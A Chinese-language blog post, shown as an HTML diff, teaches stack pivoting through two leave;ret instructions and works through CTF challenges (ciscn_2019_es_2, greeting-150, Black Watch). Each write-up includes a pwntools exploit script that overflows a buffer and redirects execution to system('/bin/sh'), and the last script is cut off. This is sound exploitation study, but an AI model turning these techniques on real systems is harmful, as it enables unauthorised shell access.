@@ -1,0 +1,342 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>关于栈迁移的学习总结 | ZIKH26's Blog</title><meta name="keywords" content="栈迁移"><meta name="author" content="ZIKH26"><meta name="copyright" content="ZIKH26"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="1、什么是栈迁移 这里我谈谈自己的理解，简单一句话：栈迁移就是换个地方控制程序的执行流（这个换的地方既可以是bss段也可以是栈里面）。 2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件） 言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于栈迁移的学习总结">
+<meta property="og:url" content="https://zikh26.github.io/posts/ee1dcd7f.html">
+<meta property="og:site_name" content="ZIKH26&#39;s Blog">
+<meta property="og:description" content="1、什么是栈迁移 这里我谈谈自己的理解，简单一句话：栈迁移就是换个地方控制程序的执行流（这个换的地方既可以是bss段也可以是栈里面）。 2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件） 言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zikh26.github.io/img/feiji.png">
+<meta property="article:published_time" content="2023-05-14T13:43:19.716Z">
+<meta property="article:modified_time" content="2022-12-23T01:41:44.000Z">
+<meta property="article:author" content="ZIKH26">
+<meta property="article:tag" content="栈迁移">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zikh26.github.io/img/feiji.png"><link rel="shortcut icon" href="/img/me.jpg"><link rel="canonical" href="https://zikh26.github.io/posts/ee1dcd7f"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '关于栈迁移的学习总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-12-23 09:41:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">94</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">97</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/feiji.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ZIKH26's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">关于栈迁移的学习总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-14T13:43:19.716Z" title="发表于 2023-05-14 21:43:19">2023-05-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-23T01:41:44.000Z" title="更新于 2022-12-23 09:41:44">2022-12-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">学习总结</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/ee1dcd7f.html" data-flag-title="关于栈迁移的学习总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1>1、什么是栈迁移</h1>
+<p>这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是换个地方控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面）。</p>
+<h1>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h1>
+<p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
+<p>使用栈迁移的条件：</p>
+<p>1、要能够栈溢出，这点尤其重要，最起码也要溢出覆盖个ebp</p>
+<p>2、需要有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</p>
+<h1>3、学习栈迁移需要自身掌握什么知识</h1>
+<pre><code>①需要掌握汇编基础
+②较为熟悉栈结构
+③以及明白函数调用与结束时栈的变化
+</code></pre>
+<p>PS：本文讨论的一切原理，都是针对于32位程序的栈迁移来说的，不过例题里面有一道是64位的栈迁移</p>
+<h1>4、栈迁移的原理</h1>
+<h3 id="font-color-red-ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）-font"><font color=red>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系）</font></h3>
+<p><img src="../img/2706180-20220118102346730-1500206355.png" alt=""></p>
+<p>ebp是0xffe7a9e8，它的内容是0xffe7aa38，而这个内容也是一个地址，这个地址里面装的又是0x8059b50。<u>ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）</u>。我这里想强调的是ebp和ebp的内容这两者一定不能混为一谈，在阅读下面的内容是，一定要注意区分两者。</p>
+<h2 id="栈迁移的核心，就在于两次的leave-ret指令上面"><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h2>
+<h3 id="在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave-ret，容易搞迷了）。">(在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave;ret，容易搞迷了）。</h3>
+<p>leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp<font color=red>（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）</font>。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图。<font color=red><strong>ps:下面几张图片，当时制作的时候，有点粗心，把leave写成level了，因此读的时候注意下这里就好了。</strong></font></p>
+<p><img src="../img/2706180-20220118102443458-1381923387.png" alt=""></p>
+<pre><code>ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图。
+</code></pre>
+<p><img src="../img/2706180-20220118102755803-79970067.png" alt=""></p>
+<h2 id="栈迁移原理：">栈迁移原理：</h2>
+<p><strong>（先讨论main函数里的栈迁移）<strong>首先</strong>利用溢出把ebp的内容</strong>给修改掉（<strong>修改成我们要迁移的那个地址</strong>），并且<strong>把返回地址填充成leave;ret指令的地址（因为我们需要两次leave;ret）</strong>（如果不会找指令地址的话，本文最后的附录中，有介绍）此时main函数准备结束。</p>
+<p><font color=red>开始执行第一个leave</font>，此时mov esp ebp让两个指针处于同一位置，现在还是正常运行，接着执行pop ebp就出现了异常，<u>因为此时ebp的内容被修改成了要迁移的地址</u>，因此执行了pop ebp，ebp并没有弹到它本应该去的地方（正常情况下，ebp里装的内容，就是它接下来执行pop ebp要去的地方），<u>而是弹到了我们修改的那个迁移后的地址</u>，接着执行了pop eip，eip里放的又是leave的地址（因为此时是把返回地址弹给eip，这个返回地址，我们先给覆盖成leave;ret的地址。<font color=red>你可能会问，如果这个返回地址不放成leave；ret的地址，行不行？很明显是不行的，因为我们想要实现栈迁移，就必须执行两个leave；ret，main函数正常结束，只有一个level;ret，因此我们在这里必须要它的返回地址写成leave;ret地址，以来进行第二次leave;ret</font>），结果又执行了leave<font color=red>（现在执行第二个leave)</font>，此时才是到了栈迁移的核心部分，<strong>mov esp ebp，ebp赋给了esp，此时esp挪到了ebp的位置，可你别忘了，现在的ebp已经被修改到了我们迁移后的地址，因此现在esp也到了迁移后的地址，接着pop ebp，把这个栈顶的内容弹给ebp，esp指向了下一个内存单元，此时我们只需要将这个内存单元放入system函数的地址，最后执行了pop eip，此时system函数进入了eip中，我们就可以成功GetShell了</strong>。结合描述过程与下图分析，效果更佳！（下图栈中填充的aaaa以及system_addr和/bin/sh等等，都是payload一起发送过去的，最后的两个aaaa仅仅是起到了一个填充的效果）当然，具体的payload都是根据题目来分析的，这里我只是举个例子。</p>
+<p><img src="../img/2706180-20220118102850680-2070302005.png" alt=""></p>
+<p><img src="../img/2706180-20220118103002284-1311363088.png" alt=""></p>
+<p>最后来总结一下原理，核心是利用两次的leave;ret，<strong>第一次leave ret;将ebp给放入我们指定的位置（这个位置的就是迁移后的所在位置）</strong>，<strong>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是system函数的plt地址）</strong>，最终成功GetShell。</p>
+<p>原理如上，遇见不同栈迁移的题目也是根本核心万变不离其宗。</p>
+<h1>5、栈迁移的实战运用</h1>
+<p>接下来是有四道栈迁移的题目来练习。分别是</p>
+<p>攻防世界上的greeting-150</p>
+<p>BUUCTF上的[Black Watch 入群题]</p>
+<p>BUUCTF上的ciscn_2019_es_2</p>
+<p>BUUCTF上的gyctf_2020_borrowstack</p>
+<p>它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。在这里，我分别也给出他们的wp。</p>
+<hr>
+<h2 id="BUUCTF上的ciscn-2019-es-2">BUUCTF上的ciscn_2019_es_2</h2>
+<p><img src="../img/2706180-20220118103554143-806908519.jpg" alt=""><img src="../img/2706180-20220118103707874-2116954617.jpg" alt=""></p>
+<p>这里我们发现了溢出点。Read读入到s的这个地方，距离ebp只有0x28个字节，可是两个read都可以写入0x30个字节的内容，也就是说可以溢出覆盖ebp和返回地址。</p>
+<p><img src="../img/2706180-20220118103715766-1605737103.png" alt=""></p>
+<p>我们还发现了后门函数，但是没有参数。</p>
+<p><img src="../img/2706180-20220118120250348-503674972.jpg" alt=""></p>
+<p>那现在大概思路就是，我们要用第一个read来泄露下ebp的地址***（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x30个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了***），然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），参数分布参考上图</p>
+<p>为什么要拿到ebp地址呢，看上图的/bin/sh地址，我们怎么知道它的地址是什么呢，我们不知道，但是我们知道它距离ebp的偏移（通过IDA的栈图可以数出来），因此我们需要获得ebp的值，配合偏移来表达出这个地址，*<strong>这里要尤其注意这个ebp是main函数的，因为printf是打印内存单元里的内容，ebp确实是指向了vul的栈底，但是ebp里面装的内容可是main函数的栈底，因此这个ebp是main函数的栈底*</strong>。至于这个0x28怎么来的呢？</p>
+<p>这里要用gdb调试一下，断点下到哪无所谓，主要就是要看vul函数快结束的时候，看下栈图。</p>
+<p><img src="../img/2706180-20220118120659280-353618504.jpg" alt=""></p>
+<p>当然，你实际做题的时候，肯定是看不见/bin/sh装到哪了，不过没事，在IDA里面我们分析一下，然后看一下它装在哪了，还是这个图，发现/bin/sh装在了距离栈顶是有四个内存单元的距离，然后再到gdb上去数一下，也就是我们的字符串会存到0xffd9d730这个位置，然后用0xffded758减去这个0xffd9d730，就能得到这个偏移0x28了。</p>
+<p><img src="../img/2706180-20220118120250348-503674972.jpg" alt=""></p>
+<p>最后的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25986)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+<span class="number">0x8</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">level_ret_addr=<span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)<span class="comment">#第一次仅仅就是为了泄露main函数的ebp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2=(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0xffd9d730</span>)+<span class="string">&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(ebp-<span class="number">0x38</span>)+p32(level_ret_addr)<span class="comment">#这个ljust的意思是说不足0x28的部分补成00（也就是我在上图中标注的垃圾数据）这个0x38的偏移算法和上面那个0x28是相同的，这个地址是栈顶的地址，也就是我们payload中aaaa的地址，要用这个地址去覆盖ebp</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="攻防世界上的greeting-150">攻防世界上的greeting-150</h2>
+<p><img src="../img/2706180-20220118121000718-655614088.jpg" alt=""></p>
+<p>这里表面上是看开了canary，但是在主要的函数中，没有发现canary的影子，因此，这个canary保护，在这里是有点迷惑性的，我们可以去溢出。</p>
+<p><img src="../img/image-20221007101237565.png" alt="image-20221007101237565"></p>
+<p>在上图中标注了，base64decode，是将解码后的内容放在了v4里面，而不是v6里面，v6里放的是解码后的字符串长度。</p>
+<p>我之前看师傅们的wp一直纳闷，这输入的内容也没有被编码过，咋就到这里可直接就解码了，最后看到了exp才明白，原来是我们发送payload时候，我们自己去编码…，配合这个信息，我也就明白了，原来v6&gt;0xc的这个限制，是说我们payload只能发送12个字节。</p>
+<p>执行了这句之后，我们的input里面放的也是解码之后的内容了（因为我们是要把payload编码之后发送，因此这里的input实际上就是我们的payload)<br>
+<font color=red><br>
+现在input里面就是payload，这个payload只能发送12个字节</p>
+</font>
+<p>ok，我们继续去看auth这个函数。</p>
+<p><img src="../img/image-20221007101316583.png" alt="image-20221007101316583"></p>
+<p>找到了溢出点，在这里。[ebp-8h]的意思是说，这个v4距离ebp有八个字节的距离，可是input里面可以装12个字节，现在memcpy就可以把input的内容复制给了v4（这个v4和main函数里的v4不是一码事） 只能装8个字节，但是复制了12个字节过去，有什么好说的，溢出就完事了。但是只能溢出覆盖ebp，<font color=red><strong>之前栈迁移的时候，我们为了凑齐两次leave;ret都是将main函数的返回地址写成leave,ret的地址，但是这道题我们没法写到返回地址上，怎么办，我们没办法凑够两次leave;ret了么，不不不，别忘了我们现在可不在main函数还是在auth函数里面，当auth函数结束的时候也会执行一次leave;ret再加上main函数结束的一次leave;ret，因此我们也凑够了两次leave;ret。</strong></font></p>
+<p>我们需要换到哪个地方去执行后门函数呢？没错，就是刚才说的input</p>
+<p><img src="../img/image-20221007101341015.png" alt="image-20221007101341015"></p>
+<p>这里也可以看到input是处于bss段的。</p>
+<p>现在我们来看这道题，我们可以往input里面输入12个字节，那假设我输入的是aaaabbbbcccc，<font color=red>（并且这个cccc是aaaabbbbcccc这个字符串的首地址）。</font></p>
+<p>那么现在栈里就是这么个情况<br>
+<img src="../img/image-20221007101352060.png" alt="image-20221007101352060" style="zoom:50%;" /></p>
+<p>当执行到leave的时候，mov esp ebp，此时的esp是cccc了，然后ebp原本该回到正常的main函数的栈底，可是现在它来到了cccc的这个地址（因为执行了auth函数中的leave ret，这里才是核心点）（并且要注意的是ebp内容和ebp是两个东西，ebp的内容装什么都可以，但是ebp本身只能去指向地址）（即此时是ebp指向了aaaa的地址，上面说了cccc的地址是指向的aaaa所处位置）。</p>
+<p>现在程序继续运行，因为函数的返回地址是正常的，所以它还是回到了main函数里，它又开始往下运行，直到main函数结束了，它开始执行leave，那么此时我们又一次mov esp ebp；esp成了aaaa的地址，这个时候又进行了pop ebp，那么esp成了bbbb，最后到ret的时候，pop eip，此时就会把栈顶的bbbb，弹入eip去执行了。</p>
+<p>如果感觉我说的太抽象了，没有图片的话，可以参考这个师傅的文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43868725/article/details/108366539?ops_request_misc=%7B%22request%5Fid%22%3A%22164229926316780265467309%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=164229926316780265467309&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108366539.first_rank_v2_pc_rank_v29&amp;utm_term=format2&amp;spm=1018.2226.3001.4187">(24条消息) format2(xctf)_whiteh4nd的博客-CSDN博客</a>，他这里面最后画的三张图片，描述的很清楚，我上面的叙述过程，跟他图片表达的是一个意思。</p>
+<p>最后，我们拐过来看一下，eip执行了bbbb，那我们把bbbb换成后门函数的地址不就ok了，然后是cccc的这个地址，不就是我们这道题的input地址么，input本身能装12个字节，把它本身的地址写到cccc，就是12个字节的最后4字节，这样不就把栈迁移到input的内容里了么（但事实上栈没有过去，毕竟这里可是bss段）</p>
+<p>Exp编写很简单</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">59650</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x08049284</span></span><br><span class="line"></span><br><span class="line">input_addr=<span class="number">0x0811EB40</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(input_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>至此本题也就结束了。</p>
+<p>但通过这道题，我学到了不少的东西。</p>
+<p>尤其是这个函数</p>
+<img src="../img/2706180-20220118123108947-994146250.jpg" alt="EJnn.jpg" border="0">
+<p>这里我一直是在想怎么把input写成这个-559038737，而忘记了其实不必循规蹈矩，因为没开pie，我们完全可以把这个system函数的地址去弄到eip里面使其执行。也认识到了找漏洞点的重要性，上来就去仔细分析函数的功能用处不大，大致扫过即可，先去找明显的漏洞点，在围绕这个漏洞点想一下，我们能利用它做些什么。</p>
+<hr>
+<hr>
+<h2 id="BUUCTF上的-Black-Watch-入群题">BUUCTF上的[Black Watch 入群题]</h2>
+<img src="../img/2706180-20220118123108942-1379753087.jpg" alt="E2mG.jpg" border="0">
+<pre><code>打开IDA发现，主程序中，buf距离栈底有0x18个字节，但是最后的一个read却可以读入0x20个字节，很明显这里存在溢出，但是吧，这个溢出的长度也是很尴尬的，我们确实可以填入system函数地址，但是这样就没办法传参数了，而且我们发现程序里也没有system函数，因此肯定还是要泄露函数地址，用libc里面的system获取shell。
+
+我们发现这里的溢出刚好可以覆盖ebp和返回地址，很明显这里要用栈迁移。然后我们再看下第一个read把输入的内容储存到哪了
+</code></pre>
+ <img src="../img/2706180-20220118123108938-1447621027.jpg" alt="EfG9.jpg" border="0">
+<p>发现是存到了bss段。</p>
+<p>那我们的思路大概就出来的，首先把在第一次输入中read去把write_plt的地址和它的参数存进去，因为我们想要system函数地址肯定是需要先泄露libc基地址的。然后第二次输入去把ebp给改成bss段的地址，然后把返回地址改成leave,ret地址（具体原因参考栈迁移原理）</p>
+<p>然后程序从main函数返回的时候，被劫持到了bss段，去执行了write函数，泄露出来write函数的got地址，<strong>并且把它的返回地址填写成main函数</strong>，因为我们需要再让程序跑一次，毕竟我们最终可是要去执行system函数的，现在只是把libc基地址给泄露出来了而已。</p>
+<p>现在执行完了write函数，然后返回到main函数重新获得了两次输入的机会，那么我们依然如法炮制，在第一次输入中存入system函数地址和它的参数，此时各单位以就位，就差了修改ebp了，然后来到了第二次输入，我们先填充垃圾数据，直到填充至ebp，然后把ebp的地址写成bss段的地址，还要把返回地址写成leave;ret的地址。</p>
+<p>最后main函数返回的时候就进行了栈迁移，来到了我们步骤的bss段，然后执行system函数，成功GetShell。</p>
+<p>以上只是介绍了本题的思路，但是没有探究原理，具体原理参考前面的栈迁移原理部分。</p>
+<p>本题的exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27917</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span 